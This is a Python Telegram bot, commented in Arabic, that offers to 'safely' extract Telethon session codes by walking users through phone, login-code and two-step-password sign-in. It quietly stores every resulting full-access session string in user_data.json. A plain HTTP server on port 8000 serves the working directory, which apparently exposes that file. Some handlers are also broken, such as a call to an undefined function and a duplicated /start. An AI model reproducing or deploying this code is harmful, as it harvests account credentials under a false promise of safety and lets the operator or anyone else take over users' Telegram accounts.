from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import PhoneCodeExpiredError, SessionPasswordNeededError
from telethon.tl.functions.channels import GetParticipantRequest
import json
import asyncio
import os
import http.server
import socketserver
import threading

api_id = os.getenv('api_id')  # api_id
api_hash = os.getenv('api_hash')  # api_hash
bot_token = os.getenv('bot_token')  # bot_token

developer_id = int(os.getenv('developer_id'))

broadcast_state = {}  # حالة الإذاعة
maintenance_state = {}  # حالة الصيانة
maintenance_mode = False  # وضع الصيانة
maintenance_message = ""  # رسالة الصيانة
CHANNEL_USERNAME = '@EREN_PYTHON'  # قناة الاشتراك الإجباري

# تهيئة عميل البوت
bot = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)

# تعريف متغير لتخزين بيانات المستخدمين
user_accounts = {}

# دالة لحفظ البيانات في ملف
def save_data():
    with open('user_data.json', 'w') as file:
        json.dump(user_accounts, file)

# دالة لتحميل البيانات من ملف
def load_data():
    try:
        with open('user_data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

# تحميل البيانات عند بدء التشغيل
user_accounts = load_data()

# متغير لتتبع حالة المستخدمين
user_states = {}

# دالة للتحقق من اشتراك المستخدم في القناة
async def check_subscription(user_id):
    try:
        # إذا كان المستخدم هو المطور، يتم السماح له باستخدام البوت دون التحقق
        if user_id == developer_id:
            return True

        # الحصول على كائن القناة باستخدام معرف القناة (username)
        channel = await bot.get_entity(CHANNEL_USERNAME)
        # الحصول على معلومات المستخدم في القناة
        participant = await bot(GetParticipantRequest(channel, user_id))
        if participant:
            return True
        else:
            return False
    except Exception as e:
        return False

# دالة لإرسال رسالة الاشتراك الإجباري
async def send_subscription_prompt(event):
    sender = await event.get_sender()
    full_name = f"{sender.first_name} {sender.last_name or ''}".strip()
    
    buttons = [
        [Button.url("⦗ Python tools ⦘", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
        [Button.inline("تحقق", data="verify_subscription")]
    ]
    await event.reply(
        f"**• عـذراً .. عـزيـزي {full_name} 🤷🏻‍♀**\n"
        f"**• لـ إستخـدام البـوت 👨🏻‍💻**\n"
        f"**• عليك الإشتـراك في قناة البـوت الرسمية 🌐**\n"
        f"**• You must subscribe to the bot channel.**",
        buttons=buttons
    )

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    sender = await event.get_sender()
    sender_id = str(sender.id)  # تحويل إلى نص لضمان الاتساق
    username = sender.username or "بدون يوزر"
    full_name = f"{sender.first_name} {sender.last_name or ''}".strip()

    # التحقق من اشتراك المستخدم في القناة
    if not await check_subscription(sender.id):
        await send_subscription_prompt(event)
        return

    # التحقق إذا كان المستخدم مسجلًا بالفعل
    if sender_id not in user_accounts:
        # تسجيل المستخدم الجديد مع تخزين الاسم واليوزر
        user_accounts[sender_id] = {
            "name": full_name,
            "username": username,
            "sessions": [],
            "users": []
        }
        save_data()  # حفظ البيانات إلى ملف

        # إرسال رسالة للمطور عند دخول عضو جديد
        total_users = len(user_accounts)  # إجمالي عدد المستخدمين
        message = (
            f"**☑️| انضم عضو جديد**\n"
            f"━━━━━━━━━━━━━\n"
            f"👤 **الاسم:** {full_name}\n"
            f"🔗 **المعرف:** @{username if username != 'بدون يوزر' else 'بدون يوزر'}\n"
            f"🆔 **الآي دي:** `{sender_id}`\n"
            f"━━━━━━━━━━━━━\n"
            f"📊 **إجمالي الأعضاء:** {total_users}\n"
        )
        await bot.send_message(developer_id, message)

    # إرسال رسالة ترحيبية للمستخدم مع الأزرار
    welcome_message = (
        f"» **مرحبـاً {full_name}** 👋\n\n"
        f"» **فـي بـوت استخـراج كـود تنصيب زدثــون**\n"
        f"» **يعمـل هـذا البـوت لمساعدتـك بطريقـة سهلـه وآمنـه** 🏂\n"
        f"» **لـ إستخـراج كـود تنصيب زدثــون** 🎗\n\n"
        f"» **تم إضافة قسـم جـديـد لـ البـوت** ♟\n"
        f"» **لـ تحويـل كـود ᴛᴇʟᴇᴛʜᴏɴ الـى ᴩʏʀᴏɢʀᴀᴍ والعكس ..**\n"
        f"» **اضغـط الـزر (تحويل الجلسات)** 🏌‍♂"
    )

    # تعريف الأزرار
    buttons = [
        [Button.inline("ᴛᴇʟᴇᴛʜᴏɴ", data="telethon"), Button.inline("ᴩʏʀᴏɢʀᴀᴍ", data="pyrogram")],
        [Button.inline("تحويل الجلسات", data="convert_sessions")],
        [Button.url("المطور", url="https://t.me/PP2P6"), Button.url("قناة البوت", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]
    ]

    await event.reply(welcome_message, buttons=buttons)

# دالة لاستخراج جلسة التيرمكس
async def extract_session(event):
    sender = await event.get_sender()
    sender_id = str(sender.id)

    # إنشاء سجل للمستخدم إذا لم يكن موجودًا
    if sender_id not in user_accounts:
        user_accounts[sender_id] = {"sessions": [], "users": []}

    # تعيين حالة المستخدم إلى "في عملية تسجيل الدخول"
    user_states[sender_id] = "in_login"

    async with bot.conversation(event.sender_id) as conv:
        try:
            await conv.send_message("- حسنـا قم بـ إرسـال كـود الـ (آيبي ايدي - ᴀᴩɪ_ɪᴅ) الان 🏷\n\n- او اضغط /skip لـ المواصلـه عبـر ايبيات البـوت التلقائيـه 🪁")
            api_id_msg = await conv.get_response()
            if api_id_msg.text == '/skip':
                api_id = '24028902'
                api_hash = 'b103ee23d3f642b59db3cfa8d7769557'
            else:
                api_id = api_id_msg.text
                await conv.send_message("- حسنـا قم بـ إرسـال كـود الـ (آيبي هاش - ᴀᴩɪ_ʜᴀsʜ) الان 🏷\n\n- او اضغط /cancel لـ الالغـاء")
                api_hash_msg = await conv.get_response()
                if api_hash_msg.text == '/cancel':
                    await conv.send_message("» تم الالغـاء ...\n» ارسـل  /start  لـ البـدء مـن جديـد")
                    del user_states[sender_id]  # إزالة حالة المستخدم
                    return
                api_hash = api_hash_msg.text

            # إرسال رسالة مع زر لإرسال جهة الاتصال
            contact_button = [[Button.request_phone("إرسال جهة الاتصال", resize=True, single_use=True)]]
            await conv.send_message("- قم بالضغـط ع زر ارسـال جهـة الاتصـال\n- او إرسـال رقـم الهاتـف مع مفتـاح الدولـة\n- مثال : +967777117888", buttons=contact_button)
            phone_number_msg = await conv.get_response()
            if phone_number_msg.text == '/cancel':
                await conv.send_message("» تم الالغـاء ...\n» ارسـل  /start  لـ البـدء مـن جديـد")
                del user_states[sender_id]  # إزالة حالة المستخدم
                return
            phone_number = phone_number_msg.text if not phone_number_msg.contact else phone_number_msg.contact.phone_number

            # إرسال رسالة "جاري إرسال كود الدخول ⎙...."
            sending_code_msg = await conv.send_message("**جـاري ارسـال كـود الدخـول ⎙....**")

            # بدء عملية تسجيل الدخول
            client = TelegramClient(StringSession(), api_id, api_hash)
            await client.connect()
            if not await client.is_user_authorized():
                await client.send_code_request(phone_number)
                await sending_code_msg.delete()  # حذف الرسالة بعد إرسال الكود
                code_message = await conv.send_message("- قم بـ ارسـال الكود الذي وصل اليك من الشركة\n\n- اضغـط الـزر بالاسفـل لـ الذهاب لـ اشعـارات Telegram", buttons=[[Button.url("إضغط هنا", "tg://openmessage?user_id=777000")]])
                verification_code_msg = await conv.get_response()
                if verification_code_msg.text == '/cancel':
                    await conv.send_message("» تم الالغـاء ...\n» ارسـل  /start  لـ البـدء مـن جديـد")
                    del user_states[sender_id]  # إزالة حالة المستخدم
                    return
                verification_code = verification_code_msg.text

                try:
                    await client.sign_in(phone_number, verification_code)
                except PhoneCodeExpiredError:
                    await conv.send_message("☆ ✖️ انتهت صلاحية الكود. حاول مرة أخرى.")
                    del user_states[sender_id]  # إزالة حالة المستخدم
                    return
                except SessionPasswordNeededError:
                    await conv.send_message("- قـم بادخـال كلمـة مـرور حسابـك ( التحقق بـ خطوتين ).\n- بــدون مســافـات")
                    password_msg = await conv.get_response()
                    if password_msg.text == '/cancel':
                        await conv.send_message("» تم الالغـاء ...\n» ارسـل  /start  لـ البـدء مـن جديـد")
                        del user_states[sender_id]  # إزالة حالة المستخدم
                        return
                    password = password_msg.text
                    await client.sign_in(password=password)

            # إرسال رسالة جاري إنشاء الجلسة
            creating_session_msg = await conv.send_message("**جـارِ إنشـاء جلسـة البـوت ⌬ . . .**")
            await asyncio.sleep(2)  # انتظار لمدة 2 ثواني
            await creating_session_msg.delete()  # حذف الرسالة بعد الانتهاء

            # حفظ الجلسة واسم المستخدم
            session_str = client.session.save()
            user = await client.get_me()  # الحصول على معلومات الحساب
            user_accounts[sender_id]["sessions"].append(session_str)
            user_accounts[sender_id]["users"].append(f"{user.id} - {user.first_name}")  # حفظ ID واسم المستخدم

            # تخزين الجلسات في ملف
            save_data()

            # إرسال الجلسة للمستخدم في الرسائل المحفوظة
            await client.send_message('me', f"**تم استخـراج كـود جلسـة ᴛᴇʟᴇᴛʜᴏɴ .. بنجـاح ✅**\n\n```{session_str}```")

            # إرسال رسالة تأكيد للمستخدم مع زر للانتقال إلى الرسائل المحفوظة
            await conv.send_message(
                "**تم استخـراج كـود جلسـة ᴛᴇʟᴇᴛʜᴏɴ .. بنجـاح ✅**\n\n"
                "**تم ارسـال الكـود لحافظـة حسـابـك للامـان 😇**\n\n"
                "**اضغـط الـزر بالاسفـل للانتقـال لحافظـة حسابك**",
                buttons=[[Button.url("إضغط هنا", f"tg://openmessage?user_id={sender_id}")]]
            )

            # إزالة حالة المستخدم بعد الانتهاء
            del user_states[sender_id]

        except asyncio.TimeoutError:
            await event.reply("**عـذراً .. لقـد انتهـى الوقت**\n**ارسـل  /start  لـ البـدء مـن جديـد**")
            if sender_id in user_states:
                del user_states[sender_id]
        except Exception as e:
            await conv.send_message(f"**☆ ❌ حدث خطأ: {str(e)}**")
            if sender_id in user_states:
                del user_states[sender_id]  # إزالة حالة المستخدم في حالة حدوث خطأ

# معالجة الأمر /cancel
@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_handler(event):
    try:
        sender = await event.get_sender()
        sender_id = str(sender.id)

        # التحقق إذا كان المستخدم في عملية تسجيل الدخول
        if sender_id in user_states and user_states[sender_id] == "in_login":
            # التحقق من الرسالة الأخيرة التي أرسلها البوت
            last_message = await bot.get_messages(sender_id, limit=1)
            if last_message and "حسنـا قم بـ إرسـال كـود الـ (آيبي هاش - ᴀᴩɪ_ʜᴀsʜ) الان 🏷" in last_message[0].message:
                await event.reply("» تم الالغـاء ...\n» ارسـل  /start  لـ البـدء مـن جديـد")
                del user_states[sender_id]  # إزالة حالة المستخدم
    except Exception as e:
        pass  # تجاهل الأخطاء

# معالجة الأمر /skip
@bot.on(events.NewMessage(pattern='/skip'))
async def skip_handler(event):
    try:
        sender = await event.get_sender()
        sender_id = str(sender.id)

        # التحقق إذا كان المستخدم في عملية تسجيل الدخول
        if sender_id in user_states and user_states[sender_id] == "in_login":
            # استخدام الـ API ID والـ API Hash الافتراضية
            api_id = '24028902'
            api_hash = 'b103ee23d3f642b59db3cfa8d7769557'

            # الانتقال مباشرة إلى طلب رقم الهاتف
            contact_button = [[Button.request_phone("إرسال جهة الاتصال", resize=True, single_use=True)]]
            await event.reply("قم بالضغط على الزر أدناه لإرسال جهة الاتصال:", buttons=contact_button)
    except Exception as e:
        pass  # تجاهل الأخطاء


# دالة لتحويل الجلسات
async def convert_session(event):
    sender = await event.get_sender()
    sender_id = str(sender.id)

    # التحقق من اشتراك المستخدم في القناة
    if not await check_subscription(event.sender_id):
        await send_subscription_prompt(event)
        return

    # إرسال رسالة مع زرين لاختيار نوع الجلسة
    buttons = [
        [Button.inline("ᴛᴇʟᴇᴛʜᴏɴ", data="convert_telethon"), Button.inline("ᴩʏʀᴏɢʀᴀᴍ", data="convert_pyrogram")]
    ]
    await event.edit("» حسنـاً .. عـزيـزي 🙋🏻‍♀\n» اخـتر نـوع الجلسـة التي تريد التحويل منها:", buttons=buttons)

@bot.on(events.CallbackQuery(pattern="convert_telethon"))
async def convert_telethon(event):
    sender = await event.get_sender()
    sender_id = str(sender.id)

    # التحقق من اشتراك المستخدم في القناة
    if not await check_subscription(event.sender_id):
        await send_subscription_prompt(event)
        return

    async with bot.conversation(event.sender_id) as conv:
        try:
            await conv.send_message("» حسنـاً .. عـزيـزي 🙋🏻‍♀\n» قم بـ ارسـال كـود ᴛᴇʟᴇᴛʜᴏɴ الان 🏷")
            session_msg = await conv.get_response()
            session_str = session_msg.text

            # محاولة تحميل الجلسة باستخدام telethon
            try:
                from telethon.sessions import StringSession
                client = TelegramClient(StringSession(session_str), api_id, api_hash)
                await client.connect()
                if await client.is_user_authorized():
                    # إذا نجح الاتصال، فهي جلسة telethon
                    await conv.send_message("**الجلسة صالحة، ولكن تم إلغاء عملية التحويل.**")
                else:
                    await conv.send_message("**الجلسة غير صالحة.**")
            except Exception as e:
                await conv.send_message("**الجلسة غير صالحة.**")
        except Exception as e:
            await conv.send_message(f"**☆ ❌ حدث خطأ: {str(e)}**")

@bot.on(events.CallbackQuery(pattern="convert_pyrogram"))
async def convert_pyrogram(event):
    sender = await event.get_sender()
    sender_id = str(sender.id)

    # التحقق من اشتراك المستخدم في القناة
    if not await check_subscription(event.sender_id):
        await send_subscription_prompt(event)
        return

    async with bot.conversation(event.sender_id) as conv:
        try:
            await conv.send_message("» حسنـاً .. عـزيـزي 🙋🏻‍♀\n» قم بـ ارسـال كـود ᴩʏʀᴏɢʀᴀᴍ الان 🏷")
            session_msg = await conv.get_response()
            session_str = session_msg.text

            # محاولة تحميل الجلسة باستخدام pyrogram
            try:
                from pyrogram import Client
                pyro_client = Client(":memory:", session_string=session_str, api_id=api_id, api_hash=api_hash)
                await pyro_client.start()
                if await pyro_client.get_me():
                    # إذا نجح الاتصال، فهي جلسة pyrogram
                    from telethon.sessions import StringSession
                    telethon_session_str = StringSession.save(pyro_client.session)
                    await conv.send_message(f"**تم تحويل جلسة البيروجرام إلى تيرمكس بنجاح ✅**\n\n```{telethon_session_str}```")
                    await pyro_client.stop()
                    return
            except Exception as e:
                await conv.send_message(f"**عذراً، الجلسة المرسلة غير صالحة**")
        except Exception as e:
            await conv.send_message(f"**☆ ❌ حدث خطأ: {str(e)}**") 

# معالجة الضغط على الأزرار
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode('utf-8')  # فك تشفير البيانات المرسلة مع الزر

    if data == "telethon":
        # التحقق من اشتراك المستخدم في القناة
        if not await check_subscription(event.sender_id):
            await send_subscription_prompt(event)
            return
        await event.answer()  # إزالة alert=True لمنع الرسالة المنبثقة
        await extract_telethon_session(event)  # استخراج جلسة Telethon
    elif data == "pyrogram":
        # التحقق من اشتراك المستخدم في القناة
        if not await check_subscription(event.sender_id):
            await send_subscription_prompt(event)
            return
        # إرسال رسالة تفيد بأن الزر في حالة صيانة بالعربية والإنجليزية
        await event.answer("الزر في حالة صيانة سيتم تشغيله قريبًا\nButton is under maintenance and will be activated soon.", alert=True)
    elif data == "convert_sessions":
        # التحقق من اشتراك المستخدم في القناة
        if not await check_subscription(event.sender_id):
            await send_subscription_prompt(event)
            return
        await event.answer()  # إزالة alert=True لمنع الرسالة المنبثقة
        await convert_session(event)
    elif data == "verify_subscription":
        # التحقق من اشتراك المستخدم في القناة
        if await check_subscription(event.sender_id):
            await event.answer("تم التحقق ✔️", alert=True)
            await start(event)  # إعادة إرسال رسالة الترحيب
        else:
            await event.answer("عذراً، لم تشترك في القناة بعد.", alert=True)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    sender = await event.get_sender()
    sender_id = sender.id  # الحصول على ID المستخدم

    # التحقق من أن المستخدم هو المطور
    if sender_id == developer_id:
        # إرسال رسالة ترحيبية للمطور
        welcome_message = (
            "**مرحبًا بك عزيزي المطور! 👋**\n\n"
            "**يمكنك إدارة البوت باستخدام الأزرار التالية:**"
        )

        # إرسال القائمة الرئيسية للمطور
        buttons = [
            [Button.inline("إذاعة 📢", data="broadcast")],
            [Button.inline("📊 إحصائيات البوت", data="stats")],
            [Button.inline("تفعيل الصيانه", data="enable_maintenance")],
            [Button.inline("إيقاف الصيانه", data="disable_maintenance")]
        ]
        await event.reply(welcome_message, buttons=buttons)

# التعامل مع زر الإذاعة
@bot.on(events.CallbackQuery(pattern='broadcast'))
async def handle_broadcast(event):
    chat_id = event.sender_id

    # التحقق من أن المستخدم مطور
    if chat_id != developer_id:
        await event.answer("عذراً، هذا الأمر للمطورين فقط.", alert=True)
        return

    # وضع المستخدم في حالة إذاعة
    broadcast_state[chat_id] = True

    # تعديل الرسالة الحالية بدلاً من إرسال رسالة جديدة
    buttons = [[Button.inline("رجوع ↩️", data="back_to_main")]]
    await event.edit(
        "**• أرسل الآن الكليشة ( النص أو جميع الوسائط )**\n"
        "**• يمكنك استخدام كود جاهز في الإذاعة أو يمكنك استخدام الماركدوان**",
        buttons=buttons
    )

# التعامل مع زر الرجوع إلى القائمة الرئيسية
@bot.on(events.CallbackQuery(pattern='back_to_main'))
async def back_to_main(event):
    chat_id = event.sender_id

    # التحقق من أن المستخدم مطور
    if chat_id != developer_id:
        await event.answer("عذراً، هذا الأمر للمطورين فقط.", alert=True)
        return

    # إعادة تعيين حالة الإذاعة
    broadcast_state[chat_id] = False

    # إعادة عرض القائمة الرئيسية
    buttons = [
        [Button.inline("إذاعة 📢", data="broadcast")],
        [Button.inline("📊 إحصائيات البوت", data="stats")],
        [Button.inline("تفعيل الصيانه", data="enable_maintenance")],
        [Button.inline("إيقاف الصيانه", data="disable_maintenance")]
    ]
    await event.edit(
        "**• مرحبا عزيزي المطور يمكنك في اوامر البوت الخاص بك عن طريق الازرار التالية 🦾**",
        buttons=buttons
    )

# التعامل مع زر إحصائيات البوت
@bot.on(events.CallbackQuery(pattern='stats'))
async def handle_stats(event):
    chat_id = event.sender_id

    # التحقق من أن المستخدم مطور
    if chat_id != developer_id:
        await event.answer("عذراً، هذا الأمر للمطورين فقط.", alert=True)
        return

    # عرض إحصائيات البوت
    total_users = len(user_accounts)  # عدد المستخدمين المسجلين
    stats_message = (
        f"**📊 إحصائيات البوت:**\n\n"
        f"**👥 عدد المستخدمين:** {total_users}\n\n"
    )

    buttons = [[Button.inline("رجوع ↩️", data="back_to_main")]]
    await event.edit(stats_message, buttons=buttons)

# التعامل مع زر تفعيل الصيانة
@bot.on(events.CallbackQuery(pattern='enable_maintenance'))
async def enable_maintenance(event):
    chat_id = event.sender_id

    # التحقق من أن المستخدم مطور
    if chat_id != developer_id:
        await event.answer("عذراً، هذا الأمر للمطورين فقط.", alert=True)
        return

    # وضع المستخدم في حالة انتظار رسالة الصيانة
    maintenance_state[chat_id] = True

    buttons = [[Button.inline("رجوع ↩️", data="back_to_main")]]
    await event.edit(
        "**• أرسل الآن الرسالة التي تريد أن تظهر للمستخدمين أثناء الصيانة:**",
        buttons=buttons
    )

# التعامل مع زر إيقاف الصيانة
@bot.on(events.CallbackQuery(pattern='disable_maintenance'))
async def disable_maintenance(event):
    chat_id = event.sender_id

    # التحقق من أن المستخدم مطور
    if chat_id != developer_id:
        await event.answer("عذراً، هذا الأمر للمطورين فقط.", alert=True)
        return

    # إيقاف حالة الصيانة
    global maintenance_mode, maintenance_message
    maintenance_mode = False
    maintenance_message = ""

    buttons = [[Button.inline("رجوع ↩️", data="back_to_main")]]
    await event.edit(
        "**• تم إيقاف الصيانة بنجاح ✅**",
        buttons=buttons
    )

# التعامل مع الرسائل أثناء حالة الصيانة
@bot.on(events.NewMessage)
async def handle_maintenance_message(event):
    chat_id = event.sender_id

    if maintenance_state.get(chat_id, False):
        global maintenance_mode, maintenance_message
        maintenance_mode = True
        maintenance_message = event.text

        # إعادة تعيين حالة الصيانة
        maintenance_state[chat_id] = False

        # إرسال رسالة تأكيد
        await event.reply("**تم تفعيل وضع الصيانة بنجاح ✅**")

        # إعادة عرض القائمة الرئيسية
        buttons = [
            [Button.inline("إذاعة 📢", data="broadcast")],
            [Button.inline("📊 إحصائيات البوت", data="stats")],
            [Button.inline("تفعيل الصيانه", data="enable_maintenance")],
            [Button.inline("إيقاف الصيانه", data="disable_maintenance")]
        ]
        await event.reply(
            "**• مرحبا عزيزي المطور يمكنك في اوامر البوت الخاص بك عن طريق الازرار التالية 🦾**",
            buttons=buttons
        )

# التعامل مع الرسائل أثناء حالة الإذاعة
@bot.on(events.NewMessage)
async def handle_broadcast_message(event):
    chat_id = event.sender_id

    if broadcast_state.get(chat_id, False):
        # إرسال الرسالة إلى جميع المستخدمين
        for user_id, user_data in user_accounts.items():
            try:
                await bot.send_message(int(user_id), event.text)
            except Exception as e:
                print(f"Error sending broadcast to user {user_id}: {e}")

        # إعادة تعيين حالة الإذاعة
        broadcast_state[chat_id] = False

        # إرسال رسالة تأكيد
        await event.reply("**تم إرسال الإذاعة بنجاح ✅**")

        # إعادة عرض القائمة الرئيسية
        buttons = [
            [Button.inline("إذاعة 📢", data="broadcast")],
            [Button.inline("📊 إحصائيات البوت", data="stats")],
            [Button.inline("تفعيل الصيانه", data="enable_maintenance")],
            [Button.inline("إيقاف الصيانه", data="disable_maintenance")]
        ]
        await event.reply(
            "**• مرحبا عزيزي المطور يمكنك في اوامر البوت الخاص بك عن طريق الازرار التالية 🦾**",
            buttons=buttons
        )
        
def run_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", 8000), handler) as httpd:
        print("Serving on port 8000")
        httpd.serve_forever()

# تشغيل الخادم في خيط جديد
server_thread = threading.Thread(target=run_server)
server_thread.start()	                

# تشغيل البوت
print("Bot is running...")
bot.run_until_disconnected()
